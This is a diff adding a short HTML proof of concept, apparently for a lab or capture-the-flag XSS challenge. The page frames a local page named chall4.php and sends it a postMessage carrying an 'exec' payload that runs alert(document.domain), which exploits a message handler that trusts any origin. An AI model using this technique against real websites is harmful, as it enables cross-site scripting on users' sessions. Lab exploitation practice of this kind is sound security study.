@@ -1,0 +1,18 @@
+<html>
+
+<body>
+<iframe id=target></iframe>
+</body>
+</html>
+
+<script>
+
+var target = document.getElementById('target')
+
+target.addEventListener('load', () => {
+
+target.contentWindow.postMessage({"action": "exec" , "payload": "alert(document.domain)"}, '*')	
+})
+
+target.src= "http://127.0.0.1/xss/chall4.php";
+</script>
